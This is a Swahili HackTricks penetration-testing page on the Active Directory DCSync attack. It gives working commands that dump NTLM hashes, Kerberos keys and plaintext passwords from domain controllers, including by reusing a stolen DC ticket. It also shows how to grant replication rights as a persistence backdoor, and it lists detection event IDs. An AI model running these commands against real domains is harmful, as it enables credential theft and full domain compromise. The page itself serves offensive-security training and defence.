# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Ruhusa ya **DCSync** inamaanisha kuwa na ruhusa hizi kwenye domain yenyewe: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** na **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Maelezo Muhimu kuhusu DCSync:**

- **DCSync attack huiga tabia ya Domain Controller na kuwaomba Domain Controller wengine warudie taarifa** kwa kutumia Directory Replication Service Remote Protocol (MS-DRSR). Kwa kuwa MS-DRSR ni kazi halali na muhimu ya Active Directory, haiwezi kuzimwa au kulemazwa.
- Kwa chaguomsingi, ni makundi ya **Domain Admins, Enterprise Admins, Administrators, na Domain Controllers** pekee yaliyo na ruhusa zinazohitajika.
- Kwa vitendo, **DCSync kamili** inahitaji **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** kwenye domain naming context. `DS-Replication-Get-Changes-In-Filtered-Set` kwa kawaida hukabidhiwa pamoja na ruhusa hizo, lakini peke yake inahusiana zaidi na kusawazisha **sifa za siri / zilizochujwa na RODC** (kwa mfano siri za mtindo wa zamani wa LAPS) kuliko kutoa dump kamili ya krbtgt.<sup>[[2]](#references)</sup>
- Ikiwa nywila za akaunti zozote zimehifadhiwa kwa kutumia reversible encryption, Mimikatz ina chaguo la kuonyesha nywila katika maandishi wazi.

### Enumeration

Angalia nani aliye na ruhusa hizi ukitumia `powerview`:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

Ikiwa unataka kulenga **principals zisizo za chaguomsingi** zilizo na ruhusa za DCSync, chuja vikundi vilivyojengewa ndani vyenye uwezo wa replication na kagua trustees zisizotarajiwa:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Fanya Exploit Ndani ya Mfumo

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Exploit kwa Mbali

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Mifano ya vitendo yenye wigo maalum:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync kwa kutumia TGT ya mashine ya DC iliyonaswa (ccache)

Unapokagua huduma kwenye domain controller, tofautisha utambulisho wake wa huduma ya ndani na utambulisho wake wa mtandao. [Microsoft documents](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions) kwamba akaunti pepe za SQL Server (`NT SERVICE\...`) hufikia rasilimali za mtandao kwa kutumia akaunti ya kompyuta mwenyeji. Kwenye domain controller, hili linaweza kufanya akaunti ya mashine ya DC ihusike katika ukaguzi wa haki za replication, lakini kupata ufikiaji wa huduma pekee hakuthibitishi kuwa kuna TGT ya mashine inayoweza kuhamishwa au uthibitishaji wa DCSync unaoweza kutumika. Thibitisha utambulisho halisi wa huduma, muktadha wa uthibitishaji wa kutoka, tiketi au credentials zinazopatikana, na haki halisi za replication kabla ya kuchukulia hili kama njia.

Katika hali za unconstrained-delegation za export-mode, unaweza kunasa TGT ya mashine ya Domain Controller (kwa mfano, `DC1$@DOMAIN` kwa `krbtgt@DOMAIN`). Kisha unaweza kutumia ccache hiyo kujithibitisha kama DC na kutekeleza DCSync bila nenosiri.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Vidokezo vya kiutendaji:

- **Njia ya Kerberos ya Impacket hugusa SMB kwanza** kabla ya kuita DRSUAPI. Ikiwa mazingira yanatekeleza **uthibitishaji wa jina lengwa la SPN**, dump kamili inaweza kushindwa kwa sababu `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Katika hali hiyo, omba tiketi ya huduma ya **`cifs/<dc>`** ya DC lengwa kwanza, au tumia **`-just-dc-user`** kupata akaunti unayohitaji mara moja.
- Ukiwa na haki za chini pekee za replication, usawazishaji wa mtindo wa LDAP/DirSync bado unaweza kufichua sifa **confidential** au **zilizochujwa na RODC** (kwa mfano `ms-Mcs-AdmPwd` ya zamani) bila kufanya replication kamili ya krbtgt.<sup>[[2]](#references)</sup>

`-just-dc` hutengeneza faili 3:

- moja yenye **NTLM hashes**
- moja yenye **Kerberos keys**
- moja yenye nywila za maandishi wazi kutoka NTDS kwa akaunti zozote ambazo [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) imewashwa. Unaweza kupata watumiaji walio na reversible encryption kwa kutumia

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Kudumu

Ikiwa wewe ni msimamizi wa domain, unaweza kumpa mtumiaji yeyote ruhusa hizi kwa usaidizi wa PowerView:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Waendeshaji wa Linux wanaweza kufanya vivyo hivyo kwa kutumia `bloodyAD`:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Kisha, unaweza **kuangalia kama mtumiaji alipewa privileges 3 kwa usahihi** kwa kuzitafuta kwenye matokeo ya (unapaswa kuona majina ya privileges ndani ya sehemu ya "ObjectType"):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Mikakati ya Kupunguza Hatari

- Security Event ID 4662 (Audit Policy ya object lazima iwezeshwe) – Operesheni ilifanywa kwenye object<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Audit Policy ya object lazima iwezeshwe) – Object ya directory service ilibadilishwa
- Security Event ID 4670 (Audit Policy ya object lazima iwezeshwe) – Ruhusa kwenye object zilibadilishwa
- AD ACL Scanner - Unda na ulinganishe ripoti za ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Kutumia Replication Get-Changes na Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Kutoa Password Hashes kutoka kwa Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync hadi DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
